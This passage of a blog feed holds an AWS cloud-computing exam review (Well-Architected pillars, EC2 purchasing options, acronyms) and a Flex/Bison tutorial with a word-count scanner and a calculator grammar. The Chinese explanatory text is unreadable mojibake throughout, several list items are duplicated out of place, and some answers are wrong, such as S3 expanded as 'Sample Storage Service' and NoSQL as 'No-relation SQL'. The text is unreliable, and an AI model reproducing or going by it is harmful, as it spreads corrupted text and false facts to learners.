&lt;p>List three ways to expire contents within Amazon CloudFront.&lt;/p>
&lt;ul>
&lt;li>Time to live (TTL)&lt;/li>
&lt;li>Change Object Name&lt;/li>
&lt;li>Invalidate Object&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>List the four pillars of the AWS Well-Architected Framework.&lt;/p>
&lt;ul>
&lt;li>Security pillar&lt;/li>
&lt;li>Reliability pillar&lt;/li>
&lt;li>Performance pillar&lt;/li>
&lt;li>Cost pillar&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>Describe three principles of the Security pillar.&lt;/p>
&lt;ul>
&lt;li>Apply security at all layer: instead of just running security appliances at edge of your infrastructure, use firewalls and other security control on all of your resources.&lt;/li>
&lt;li>Enable traceability: Log and audit all action and changes to your environment and access to yourservice&lt;/li>
&lt;li>Automate response for security events: monitor and automatically trigger response to event-driven or condition driven alters&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>Describe three principles of the Reliability pillar.&lt;/p>
&lt;ul>
&lt;li>Test recovery procedures: in cloud, you can test how your system fail, and you can validate your recovery procedures.&lt;/li>
&lt;li>Automatically recover from failure: by monitoring a system for key performance indicators(KPIs), you can trigger automation when a threshold is breached.&lt;/li>
&lt;li>Scaling horizontally to increase aggregate system reliability: replace one large sources with multiple small sources to reduce the impact of single failure on the overall system.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>Describe three principles of the Performance pillar.&lt;/p>
&lt;ul>
&lt;li>Use advanced technologies: such as edge location or edge service, can reduce latency for service and load on your system.&lt;/li>
&lt;li>Use âserverlessâ Architecture: serverless architectures remove the need for you to run and maintain servers to carry out traditional compute activities.&lt;/li>
&lt;li>Go global in minutes: easily deploy your system in multiple regions around the world with just few clicks.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>Describe three principles of the Cost pillar.
&lt;img src="http://www.guozet.me/images/in-post/2018-10-04-CPSC6440-CloudComputing-basic-concepts2/2018-10-03-22-28-10.png" alt="">&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Test recovery procedures: in cloud, you can test how your system fail, and you can validate your recovery procedures.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Automatically recover from failure: by monitoring a system for key performance indicators(KPIs), you can trigger automation when a threshold is breached.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Scaling horizontally to increase aggregate system reliability: replace one large sources with multiple small sources to reduce the impact of single failure on the overall system.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Describe three principles of the Performance pillar.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Use advanced technologies: such as edge location or edge service, can reduce latency for service and load on your system.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Use âserverlessâ Architecture: serverless architectures remove the need for you to run and maintain servers to carry out traditional compute activities.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Go global in minutes: easily deploy your system in multiple regions around the world with just few clicks.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>What are three things might you troubleshoot if your instance times out?&lt;/p>
&lt;ul>
&lt;li>check your routes&lt;/li>
&lt;li>check your security group rules&lt;/li>
&lt;li>check your network ACLs&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>What are three things might you troubleshoot if your network is unreachable?&lt;/p>
&lt;ul>
&lt;li>Check your routes&lt;/li>
&lt;li>Check your security group rules&lt;/li>
&lt;li>Check your Network ACLs&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>What are three things might you troubleshoot if the CPU load on your database is too high?&lt;/p>
&lt;ul>
&lt;li>Optimize your queries&lt;/li>
&lt;li>Use read replicas&lt;/li>
&lt;li>Ensure your are using the best instance type&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>What are three things might you troubleshoot if your access is denied?&lt;/p>
&lt;ul>
&lt;li>Verify you have permission to call that action on that resource&lt;/li>
&lt;li>verify that any resource policies specify you as a principal and grant you access&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>Describe five tradeoffs, in a table, of Instance Store, EBS, S3, and Glacier.
&lt;img src="https://lh6.googleusercontent.com/KKHztJzarMZvNVHJc63FIOplldn-oabFumiYNYsjbG7G17_KeVmjMX14y_EQ0D9K0HRBjvHT4KkEpwhrpEGQ1g3hD4fvJShriR7E2EXrq6WVLhUwVZ8IrMfzqt3rrzNIx_J7KD_qD39vAn-qDw" alt="https://lh5.googleusercontent.com/fJF5VSlHpe8MKd-ITv9MrUVVwi8WhTGd03AfhURy1DQzoaWUzx_VCxpgqcfz-O9SEnWg2nO3_MaUblXGxFIFgx6B5LViU8g8s3oEis9cVu5xMC9_EwjRA42ejU_9omoSCXY5gVfK">&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Describe five tradeoffs, in a table, of DynamoDB, RDS, and Redshift.
&lt;img src="https://lh5.googleusercontent.com/rFTk0O3qw9MpIvQAmOPaS5tumdlTSIbXFHAXQOpcOJkpj3UEnmaii-ohG3oqhhI2rNPsFQZPzd8aVw8JYAgM6vWW5VB3Ne3pEAzKra9PSrQ2DzB-rKdyAPYQ4q1TNrMyjkIKL9FFDR5KfvBcNw" alt="https://lh5.googleusercontent.com/pkfPXpoE8Bk1yVHNrrjT0EyGIebfm3J_KQFkCie2GSLtUHUaS57Ype1OGuFb_Q3xHa5fofDgkcjgeIDbGi0YGQ1hZNtzM5o58_TgFXY6GwE3mZPmUz57wVZC1v5m5pGnicWjWzJt">&lt;/p>
&lt;/li>
&lt;li>
&lt;p>List five EC2 Purchasing Options&lt;/p>
&lt;ul>
&lt;li>On-demand instances&lt;/li>
&lt;li>Spot instances&lt;/li>
&lt;li>Reserved instances&lt;/li>
&lt;li>Dedicated instances&lt;/li>
&lt;li>Dedicated hosts&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>Spot instances are provided a termination notice &lt;code>24 times?&lt;/code> prior to termination (i.e., how much time?)&lt;/p>
&lt;/li>
&lt;li>
&lt;p>List and describe the differences of three different payment models for EC2 Reserved Instances.&lt;/p>
&lt;ul>
&lt;li>All upfront: pay for the entire Reserved Instance with one upfront payment.&lt;/li>
&lt;li>Partial Upfront: make a low upfront payment, and then you are charged a discounted hourly rate for the instance for the duration of the Reserved Instance term&lt;/li>
&lt;li>No Upfront: Does not require any upfront payments and provides a discounted hourly rate for the duration of the term.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>All upfront: pay for the entire Reserved Instance with one upfront payment.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Partial Upfront: make a low upfront payment, and then you are charged a discounted hourly rate for the instance for the duration of the Reserved Instance term&lt;/p>
&lt;/li>
&lt;li>
&lt;p>No Upfront: Does not require any upfront payments and provides a discounted hourly rate for the duration of the term.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Describe the difference between a Dedicated Instance and a Dedicated Host.&lt;/p>
&lt;ul>
&lt;li>Dedicated Instances - You pay for the instances, but they get placed on whatever dedicated hardware Amazon decides.&lt;/li>
&lt;li>Dedicated Host - You pay for the entire physical server and can, in effect, run instances on it as you please.&lt;/li>
&lt;li>A Dedicated Host and a dedicated instance is that a Dedicated Host gives you additional visibility and control over how instances are placed on a physical server, and you can consistently deploy your instances to the same physical server over time. As a result, Dedicated Hosts enable you to use your existing server-bound software licenses and address corporate compliance and regulatory requirements.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>Describe one advantage of each of the following High Availability Patterns (may not get to this one)&lt;/p>
&lt;ul>
&lt;li>Job Observer&lt;/li>
&lt;li>Scheduled Scale-Out&lt;/li>
&lt;li>Multi-AZ&lt;/li>
&lt;li>High Availability Database&lt;/li>
&lt;li>Floating IP&lt;/li>
&lt;li>Floating Interface&lt;/li>
&lt;li>State Sharing&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ol></description></item><item><title>Flexä¸Bisonåºç¡æ¦å¿µä»ç»</title><link>http://www.guozet.me/post/Flex-And-Bison-Introduce/</link><pubDate>Mon, 24 Sep 2018 22:09:31 +0000</pubDate><guid>http://www.guozet.me/post/Flex-And-Bison-Introduce/</guid><description>&lt;h1 id="flexä»ç»">Flexä»ç»&lt;/h1>
&lt;p>FlexåBisoné½æ¯ç¨æ¥çæç¨åºçå·¥å·ãç¼è¯å¨çå·¥ä½ä¸»è¦å¯ä»¥åè§£æä¸¤ä¸ªæ¹é¢ï¼è¯æ³åæä¸è¯­æ³åæ&lt;/p>
&lt;ul>
&lt;li>è¯æ³åæ(lexical analysis æScanning): å°è¾å¥åå²æä¸ä¸ªä¸ªææä¹çè¯åï¼ç§°ä¹ä¸ºè®°å·&lt;code>token&lt;/code>&lt;/li>
&lt;li>è¯­æ³åæ(syntax analysis æprsing): è¿æ¯ç¡®å®è¿äºè®°å·æ¯å¦ä½å½¼æ­¤å³èçã&lt;/li>
&lt;/ul>
&lt;p>ä¸ä¸ªå°çä¾å­ï¼&lt;/p>
&lt;pre>&lt;code class="language-c++">alpha = beta + gamma;
&lt;/code>&lt;/pre>
&lt;p>è¯æ³åæå¨æ¯å°è¿äºä»£ç åè§£æä¸äº&lt;code>token&lt;/code>: alpha, ç­å·ï¼ beta, å å·ï¼ gammaååå·ãæ¥ä¸æ¥è¯­æ³åæå¨å°±éè¦ç¡®å®&lt;code>beta + gamma&lt;/code>æ¯ä¸ä¸ªè¡¨è¾¾å¼ï¼èè¿ä¸ªè¡¨è¾¾å¼è¢«èµå¼ç»äº&lt;code>alpha&lt;/code>ã&lt;/p>
&lt;h1 id="flexä¾å­">Flexä¾å­&lt;/h1>
&lt;h2 id="ç¬¬ä¸ä¸ªç®åçflexä¾å­">ç¬¬ä¸ä¸ªç®åçFlexä¾å­&lt;/h2>
&lt;p>æä»¬ä½¿ç¨flexæ¥å®ç°ä¸ä¸ªæä»¶ç&lt;code>è¡æ°ï¼åè¯æ°åå­ç¬¦æ°&lt;/code>ç»è®¡ç¨åºãåå«ä¸¤ä¸ªæä»¶&lt;code>main.cpp&lt;/code>ä»¥åflexè¯­è¨ç&lt;code>scan.l&lt;/code>ã&lt;/p>
&lt;h3 id="flexé¨åçç¨åºä»£ç ">Flexé¨åçç¨åºä»£ç &lt;/h3>
&lt;p>é¦åä»ç»&lt;code>scan.l&lt;/code>ç¨åºï¼ä»ç»ç¨åºä¹åæä»¬éè¦åäºè§£ä¸äºflexçè¯­æ³ãFlexçç¨åºä¸»è¦åå«ä¸ä¸ªé¨åï¼åä¸ªé¨åä¹é´ä½¿ç¨ä»æç&lt;code>%%&lt;/code>æ¥è¿è¡åéã&lt;/p>
&lt;ul>
&lt;li>ç¬¬ä¸é¨åï¼åå«å£°æåéé¡¹è®¾ç½®&lt;/li>
&lt;li>ç¬¬äºé¨åï¼åå«ä¸äºåçæ¨¡å¼åå¨ä½&lt;/li>
&lt;li>ç¬¬ä¸é¨åï¼è¿é¨åæ¯&lt;code>C&lt;/code>ä»£ç ï¼ä¼è¢«æ·è´å°çæçè¯æ³åæå¨ï¼å¯¹åºä»£ç æ¯ç±&lt;code>scan.l&lt;/code>æä»¶è½¬æ¢å¾å°ç&lt;code>lex.yy.c&lt;/code>ï¼éé¢çæåçä½ç½®ã&lt;/li>
&lt;/ul>
&lt;pre>&lt;code class="language-lex">%{
#include &amp;lt;iostream&amp;gt;
int lines = 0;
int words = 0;
int chars = 0;
%}
word [a-zA-Z]+
%%
{word} { ++words; chars += strlen(yytext); }
&amp;quot;\n&amp;quot; { ++lines; ++chars; }
. { chars += strlen(yytext); }
%%
int yywrap() { return 1; }
&lt;/code>&lt;/pre>
&lt;p>å¨ç¬¬ä¸é¨åç&lt;code>%{ }%&lt;/code>ä¹é´ä»£ç ä¼è¢«æ·è´å°Cæä»¶&lt;code>lex.yy.c&lt;/code>æä»¶çå¼å¤´é¨åã&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-09-24-Flex-And-Bison-Introduce/2018-09-25-23-35-45.png" alt="">&lt;/p>
&lt;p>ç¬¬äºé¨åï¼æ¯ä¸ªæ¨¡å¼å¨ç¬¬ä¸è¡çå¼å¤´ä½ç½®ï¼èåé¢æ¯æ¨¡å¼å¹éæ¶æéè¦æ§è¡ç¨åº¦Cä»£ç ãè¿éçCä»£ç å°±æ¯&lt;code>{&lt;/code>å&lt;code>}&lt;/code>ä¹é´çä¸è¡æèå¤è¡ä»£ç ã&lt;/p>
&lt;blockquote>
&lt;p>æ¨¡å¼å¿é¡»å¨è¡é¦åºç°ï¼å ä¸ºFlexä¼æç©ºç½å¼å§çè¡é½æ¯ä»£ç èæå®ä»¬å¤å¶å°çæçcç¨åºä¸­&lt;/p>
&lt;/blockquote>
&lt;p>è¯´æ&lt;code>. { chars += strlen(yytext); }&lt;/code>è¿ä¸ªä½ç½®ä½¿ç¨äºä¸ä¸ªåé&lt;code>yytext&lt;/code>,è¿è¾¹åéæ»æ¯è¢«è®¾ç½®ä¸ºæåæ¬æ¬¡å¹éçè¾å¥ææ¬ã&lt;/p>
&lt;p>ç¬¬ä¸é¨åçä»£ç ï¼æ¯ç´æ¥æ·è´å°&lt;code>lex.yy.c&lt;/code>æä»¶çæåä¸é¨åç:&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-09-24-Flex-And-Bison-Introduce/2018-09-25-23-50-51.png" alt="">&lt;/p>
&lt;p>æ¥ä¸æ¥ç¼è¯è¿ä¸ªæä»¶,ç¼è¯çæ¶åï¼ä½¿ç¨flexå¯¹åºçåºæä»¶&lt;code>-lfl&lt;/code>è¿è¡é¾æ¥ã&lt;/p>
&lt;pre>&lt;code class="language-bash">flex scan.l
gcc lex.yy.c -lfl
&lt;/code>&lt;/pre>
&lt;h2 id="mainå½æ°å®ç°æåçæå°åè½">Mainå½æ°å®ç°æåçæå°åè½&lt;/h2>
&lt;p>å¨Main()å½æ°éé¢ï¼æä»¬è°ç¨flexæä¾çè¯æ³åæä¾ç¨&lt;code>yylex()&lt;/code>,&lt;/p>
&lt;pre>&lt;code class="language-cpp">#include &amp;lt;iostream&amp;gt;
int yylex();
extern int words;
extern int lines;
extern int chars;
int main() {
yylex();
std::cout &amp;lt;&amp;lt; &amp;quot;words: &amp;quot; &amp;lt;&amp;lt; words &amp;lt;&amp;lt; std::endl;
std::cout &amp;lt;&amp;lt; &amp;quot;lines: &amp;quot; &amp;lt;&amp;lt; lines &amp;lt;&amp;lt; std::endl;
std::cout &amp;lt;&amp;lt; &amp;quot;chars: &amp;quot; &amp;lt;&amp;lt; chars &amp;lt;&amp;lt; std::endl;
return 0;
}
&lt;/code>&lt;/pre>
&lt;p>è¿è¡ç»æï¼ä½¿ç¨wcå½ä»¤è¿è¡å¯¹æ¯å¤æ­ï¼&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-09-24-Flex-And-Bison-Introduce/2018-09-26-00-03-18.png" alt="">&lt;/p>
&lt;p>å¨è¿éæä»¬ä¸ºäºæ¹ä¾¿å¯ä»¥ä½¿ç¨Markfileæ¥è¿è¡ç¼è¯çç®¡çï¼Makefileæä»¶å¦ä¸ï¼&lt;/p>
&lt;pre>&lt;code class="language-Makefile">CCC = g++
LEX = flex
CFLAGS = -Wall
LEXFLAGS = -Wno-unused
OBJS = main.o lex.yy.o
run: $(OBJS)
$(CCC) $(CFLAGS) -o run $(OBJS)
main.o: main.cpp
$(CCC) $(CFLAGS) -c main.cpp
lex.yy.c: scan.l
$(LEX) scan.l
lex.yy.o: lex.yy.c
$(CCC) $(CFLAGS) $(LEXFLAGS) -c lex.yy.c
clean:
rm -f run *.o lex.yy.c
&lt;/code>&lt;/pre>
&lt;h2 id="è¿ä¸ªä¾å­çå®æ¹å®ç°æåµ">è¿ä¸ªä¾å­çå®æ¹å®ç°æåµ&lt;/h2>
&lt;p>scan.læä»¶ï¼&lt;/p>
&lt;pre>&lt;code class="language-flex">%{
/* TERMINOLOGY: A &amp;quot;word&amp;quot; is a set of non-delimiters seperated by delimiters.
* -- edge case 1: files with a word and no delimiters
* -- edge case 2: last word of the file
* -- edge case 3: leading delimiters
* -- edge case 4: files with only delimiters
*
* A &amp;quot;line&amp;quot; is a newline character \n.
* -- Weirdly, a file written on one line with no newline
* character at the end is considered to have ZERO lines
*
* A &amp;quot;char&amp;quot; is ANY character in the file (delimiters and non-delimiters).
*/
#include &amp;lt;iostream&amp;gt;
#include &amp;lt;cstring&amp;gt;
int words = 0; // count of words
int chars = 0; // count of chars
int lines = 0; // count of lines
%}
%option noinput
%option nounput
/* definition of characters that DO NOT compose words
* ~ spaces, tabs, and newlines
*/
delimiter [ \t\n]
/* definition of characters that DO compose words
* ~ everything but spaces, stabs, and newlines
*/
letter [^ \t\n]
%%
/* This rule is for the edge-case that delimiters appear
* at the front of the file or the file has only delimiters.
*/
{delimiter}+ {
chars += strlen(yytext);
for(int i = 0; yytext[i]; ++i)
if(yytext[i] == '\n') ++lines;
}
/* This rule is for typical cases, files with one word
* and no delimiters, and the last word of the file.
*
* Note that we use the closure set of delimiters, not the
* the positive closure set. What would happen if we made this change?
*/
{letter}+{delimiter}* {
++words;
chars += strlen(yytext);
for(int i = 0; yytext[i]; ++i)
if(yytext[i] == '\n') ++lines;
}
%%
int yywrap() { return 1; }
&lt;/code>&lt;/pre>
&lt;p>main.ccæä»¶ï¼&lt;/p>
&lt;pre>&lt;code class="language-cpp">#include &amp;lt;iostream&amp;gt;
int yylex();
extern int words;
extern int lines;
extern int chars;
int main() {
yylex();
std::cout &amp;lt;&amp;lt; std::endl &amp;lt;&amp;lt; &amp;quot;~~~~~~~~~~&amp;quot; &amp;lt;&amp;lt; std::endl;
std::cout &amp;lt;&amp;lt; &amp;quot;lines: &amp;quot; &amp;lt;&amp;lt; lines &amp;lt;&amp;lt; std::endl;
std::cout &amp;lt;&amp;lt; &amp;quot;words: &amp;quot; &amp;lt;&amp;lt; words &amp;lt;&amp;lt; std::endl;
std::cout &amp;lt;&amp;lt; &amp;quot;characters: &amp;quot; &amp;lt;&amp;lt; chars &amp;lt;&amp;lt; std::endl;
return 0;
}
&lt;/code>&lt;/pre>
&lt;p>è¾åºç»æå¯¹æ¯ï¼&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-09-24-Flex-And-Bison-Introduce/2018-09-26-00-15-06.png" alt="">&lt;/p>
&lt;hr>
&lt;h1 id="ä½¿ç¨flexåbisonååå·¥ä½---è®¡ç®å¨">ä½¿ç¨FlexåBisonååå·¥ä½&amp;mdash;è®¡ç®å¨&lt;/h1>
&lt;p>è¯­æ³åæå¨æ¯æ¾åºè¾å¥è®°å·ä¹é´çå³ç³»ï¼æå¸¸è§çå³ç³»å°±æ¯è¯­æ³åææ (parser tree)&lt;/p>
&lt;h2 id="scanlæä»¶ååå·¥ä½åçåæ">Scan.læä»¶ååå·¥ä½åçåæ&lt;/h2>
&lt;p>&lt;code>scan.l&lt;/code>æä»¶ï¼å¨å¤çç¨æ·è¾å¥çæ°å­¦æ¹ç¨å¼çæ¶åï¼æä»¬ä¸ºäºå¤çç®åï¼è¿éåªèèè¯å«æ´æ°ï¼åºæ¬ç®æ¯è¿ç®ç¬¦ã&lt;/p>
&lt;blockquote>
&lt;p>è¯æ³åæå¨ä¸è¯­æ³åæå¨ååå·¥ä½
ä½¿ç¨è¯æ³åæå¨è·å¾ä¸ä¸ªè®°å·æµï¼ç¶åå°è¿ä¸ªè®°å·æµä¼ éç»å¶ä»ç¨åºï¼æ¯å½äº§çä¸ä¸ªè®°å·ä¹åï¼å°±è°ç¨yylex()æ¥è¯»åå½åå¹éå°çè¾å¥ç¶åè¿åå»ç¸åºçè®°å·ãå½ç¨åºéè¦ä¸ä¸ä¸ªè®°å·çä¼åï¼éè¦åæ¬¡è°ç¨yylex(). æ³¨æï¼è¯æ³åæå¨ä»¥ååç¨åºçæ¹å¼è¿è¡è¿è¡ï¼æ¯æ¬¡å®è¿åçæï¼å°±ä¼è®°ä½å½åå¤ççä½ç½®ï¼å¹¶ä»è¿ä¸ªä½ç½®å¼å§å»å¤çä¸ä¸æ¬¡çè°ç¨ã å¦æè¿æ¬¡å¹éä¸éè¦äº§çè®°å·ï¼é£ä¹è¯æ³åæå¨å°±ä¼å¨è¿æ¬¡yylex()è°ç¨ä¸­ç»§ç»­åææ¥ä¸æ¥çè¾å¥å­ç¬¦ã&lt;/p>
&lt;/blockquote>
&lt;p>ç¹ç¹ï¼å¦æå¨ä½æè¿åï¼é£ä¹è¯æ³åæå¨å°±ä¼å¨ä¸ä¸æ¬¡&lt;code>yylex()&lt;/code>è°ç¨ä¸­ç»§ç»­ï¼å¦æå¨ä½æ²¡æè¿åï¼è¯æ³åæå¨å°±ä¼ç«å³ç»§ç»­è¿è¡ã&lt;/p>
&lt;pre>&lt;code class="language-cpp">%{
#include &amp;quot;parse.tab.h&amp;quot;
%}
%%
&amp;quot;+&amp;quot; { return PLUS; }
&amp;quot;-&amp;quot; { return MINUS; }
&amp;quot;*&amp;quot; { return MULT; }
&amp;quot;/&amp;quot; { return DIV; }
[0-9]+ {
return NUMBER;
}
&amp;quot;\n&amp;quot; { return CR; }
&amp;lt;&amp;lt;EOF&amp;gt;&amp;gt; { yyterminate(); }
%%
int yywrap() {
yylex_destroy();
return 1;
}
&lt;/code>&lt;/pre>
&lt;p>å¨è¿ä¸ªç¨åºä¸­ï¼æä»¬å¯ä»¥çå°åºç°çè®°å·ä¸ºï¼&lt;code>PLUS, MINUS, MULT, DIV, NUMBER, CR, EOF&lt;/code>,è¿äºè®°å·æ¯å¨&lt;code>parse.tab.h&lt;/code>è¿ä¸ªæä»¶ä¸­çæçï¼èè¿ä¸ªæä»¶æ¯æ ¹æ®&lt;code>parser.y&lt;/code>çbisonæä»¶çæåºæ¥çãè¿äºè®°å·æ¯å¯¹åºäºä¸ä¸ªè®°å·ç¼å·åè®°å·å¼çãè®°å·ç¼å·æ¯ä¸ä¸ªè¾å°çæ´æ°ï¼éæºçæçï¼ä½æ¯&lt;code>0&lt;/code>æå³çæ¯æä»¶çç»æã&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-09-24-Flex-And-Bison-Introduce/2018-09-26-01-16-09.png" alt="">&lt;/p>
&lt;p>å¦ææä»¬æ³å®å¨å¨flexéé¢å®ç°è¾åºï¼é£ä¹ä¹å¯ä»¥ä½¿ç¨&lt;code>enum&lt;/code>æ¥å®ä¹è®°å·æ°å¼ç¼å·ã&lt;/p>
&lt;h2 id="bisoné¨åå·¥ä½">Bisoné¨åå·¥ä½&lt;/h2>
&lt;p>Bisonçç¨åºåå«äºä¸Flexç¨åºç¸åçä¸é¨åç»æï¼å£°æé¨åï¼è§åé¨ååCä»£ç é¨åã&lt;/p>
&lt;ul>
&lt;li>å£°æé¨åï¼åå«äºä¼è¢«åæ ·æ·è´å°ç®æ åæç¨åºå¼å¤´çCä»£ç ï¼éè¿&lt;code>%{ å }%&lt;/code>æ¥å£°æï¼ä¹åæ¯&lt;code>%token&lt;/code>è®°å·å£°æï¼ç¨äºåè¯bisonå¨è¯­æ³åæå¨éé¢è®°å·çåç§°ã (æ½è§åï¼è®°å·ä½¿ç¨å¤§åå­æ¯)å¨ç¬¬äºé¨åä¸­ï¼ä»»ä½æ²¡æå¨è¿éå£°æä¸ºè®°å·çè¯­æ³ç¬¦å·å¿é¡»åºç°å¨è³å°ä¸æ¡è§åçå·¦è¾¹&lt;/li>
&lt;li>ç¬¬äºé¨åï¼éè¿ç®åçBNFå®ä¹çè§åã Bisonä½¿ç¨ &lt;code>:&lt;/code>æ¥åå²ï¼ä½¿ç¨&lt;code>;&lt;/code>æ¥è¡¨ç¤ºè§åçç»æãå¦ææCä»£ç ï¼é£å°±éè¦å¨ä¸¤ä¸ª&lt;code>{&lt;/code> ä¸&lt;code>}&lt;/code>ä¹é´ã&lt;/li>
&lt;/ul>
&lt;pre>&lt;code class="language-c++">%{
#include &amp;lt;iostream&amp;gt;
extern int yylex();
extern int yylval;
void yyerror(const char * msg);
%}
%token CR NUMBER PLUS MINUS MULT DIV
%%
lines : lines expr CR
{ std::cout &amp;lt;&amp;lt; &amp;quot;result: &amp;quot; &amp;lt;&amp;lt; $2 &amp;lt;&amp;lt; std::endl; }
| lines CR
|
;
expr : expr PLUS term
{ $$ = $1 + $3; }
| expr MINUS term
{ $$ = $1 - $3; }
| term
{ $$ = $1; }
;
term : term MULT factor
{ $$ = $1 * $3; }
| term DIV factor
{ $$ = $1 / $3; }
| factor
{ $$ = $1; }
;
factor : NUMBER
;
%%
void yyerror(const char * msg) { std::cout &amp;lt;&amp;lt; msg &amp;lt;&amp;lt; std::endl; }
&lt;/code>&lt;/pre>
&lt;pre>&lt;code class="language-cpp">#include &amp;lt;iostream&amp;gt;
extern int yyparse();
int main() {
if ( yyparse() ) {
std::cout &amp;lt;&amp;lt; &amp;quot;syntactically correct program&amp;quot; &amp;lt;&amp;lt; std::endl;
}
return 0;
}
&lt;/code>&lt;/pre></description></item><item><title>Cloud computing Basic concepts</title><link>http://www.guozet.me/post/CPSC6440-CloudComputing-basic-concepts/</link><pubDate>Sun, 23 Sep 2018 15:09:31 +0000</pubDate><guid>http://www.guozet.me/post/CPSC6440-CloudComputing-basic-concepts/</guid><description>&lt;p>Exam 1 Review Questions. Exam 1 will be derived from these questions.&lt;/p>
&lt;p>æ³¨æï¼å ç²çé®é¢æ¯èè¯çéç¹èè¯é¢ç®&lt;/p>
&lt;p>&lt;strong>Acronyms&lt;/strong>
Expand each of the following acronyms of the following in the context of this class:&lt;/p>
&lt;ol>
&lt;li>AWS: Amazon Web Services&lt;/li>
&lt;li>AZ: Availablity Zone&lt;/li>
&lt;li>&lt;strong>EC2: Elastic Compute Cloud&lt;/strong>&lt;/li>
&lt;li>&lt;strong>S3: Sample Storage Service&lt;/strong>&lt;/li>
&lt;li>EBS: Elastic Block Store&lt;/li>
&lt;li>RDS: Relation Database Service&lt;/li>
&lt;li>&lt;strong>NoSQL: No-relation SQL&lt;/strong>&lt;/li>
&lt;li>ELB: Elastic Load Balancing&lt;/li>
&lt;li>PAAS: Platform as a service&lt;/li>
&lt;li>HAAS: Hardware as a service&lt;/li>
&lt;li>IAAS: Infrastructure as a service&lt;/li>
&lt;li>SAAS: Software as a service&lt;/li>
&lt;li>&lt;strong>CIDR: Classless inter-domain routing&lt;/strong>&lt;/li>
&lt;li>REST: Representational State Transfer&lt;/li>
&lt;li>SOAP: Simple Object Access Protocol&lt;/li>
&lt;li>&lt;strong>VPC: Virtual Private Cloud&lt;/strong>&lt;/li>
&lt;li>CTO: Chief Technology Officer&lt;/li>
&lt;li>CIO: Chief Information Officer&lt;/li>
&lt;li>AMI: Amazon Machine Image&lt;/li>
&lt;li>&lt;strong>IAM: Identity and Access Management&lt;/strong>&lt;/li>
&lt;li>&lt;strong>MFA: Multi-factor Authentication&lt;/strong>&lt;/li>
&lt;li>IOPS: I/O Operations per second&lt;/li>
&lt;li>ACL: Access Control List&lt;/li>
&lt;li>CLI: Command Line Interface&lt;/li>
&lt;li>SDK: Software Development Kit&lt;/li>
&lt;li>API: Application Interface&lt;/li>
&lt;li>JSON: JavaScript Object Notation&lt;/li>
&lt;/ol>
&lt;hr>
&lt;p>&lt;strong>General Questions&lt;/strong>&lt;/p>
&lt;ol>
&lt;li>Define cloud computing.&lt;/li>
&lt;/ol>
&lt;p>Cloud computing is the on-demand delivery of compute power, database storage, applications, and other IT resources through a cloud services platform via the internet, with pay-as-you-go pricing.
&lt;del>Cloud computing is a model for enabling convenient, on-demand network access to a shared pool of configurable computing resources (e.g. networks, servers, applications, and services) that can be rapidly provisioned and released with minimal management effort or service provider interaction.&lt;/del>&lt;/p>
&lt;ol start="2">
&lt;li>
&lt;p>Name and briefly describe six advantages and benefits of using commercial cloud computing.&lt;/p>
&lt;ul>
&lt;li>No upfront investment, users just click to order resources and can be immediate access and pay for the resources you need, which are available almost immediately.&lt;/li>
&lt;li>Low on-going costs, AWS is continually lower prices and can optimize cost with prices option&lt;/li>
&lt;li>Focus on innovation, users just need to focus on application development and do not care of other operations&lt;/li>
&lt;li>Flexible capacity, you just provision the resources you need&lt;/li>
&lt;li>Speed and agility, AWS is fast and on-demand provisioning. makes it possible for you to respond to changing market conditions.&lt;/li>
&lt;li>Global reach on demand, users can deploy any AWS region on-demand and lower latency to distributed users bases.&lt;/li>
&lt;/ul>
&lt;p>Second&lt;/p>
&lt;ul>
&lt;li>Trade Capital Expense for Variable Expense&lt;/li>
&lt;li>Benefit from massive economies of scale.&lt;/li>
&lt;li>Stop guessing about capacity.&lt;/li>
&lt;li>Increase speed and agility.&lt;/li>
&lt;li>Stop spending money running and maintaining data centers.&lt;/li>
&lt;li>Go global in minutes.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>What are the two cloud deployment models?
All-in Cloud, Hybrid Cloud, Private Cloud(On-premises).
&lt;del>Public Cloud, Private Cloud, Community Cloud and Hybrid Cloud.&lt;/del>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Explain the difference between a hybrid cloud deployment model and an All-In cloud deployment model.&lt;/p>
&lt;ul>
&lt;li>All-In&amp;rdquo; Cloud is a cloud-based application that is &lt;code>fully deployed in the cloud&lt;/code>, and all parts of the application run in the cloud.&lt;/li>
&lt;li>A hybrid deployment is a way to &lt;code>connect infrastructure and applications between cloud-based resources and existing resources&lt;/code> that are not located in the cloud.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>When was the AWS cloud first made available as a product?
2004&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Name three other commercial clouds in addition to AWS.
Google Engine, Mircosoft Azure, Sun Cloud.&lt;/p>
&lt;/li>
&lt;li>
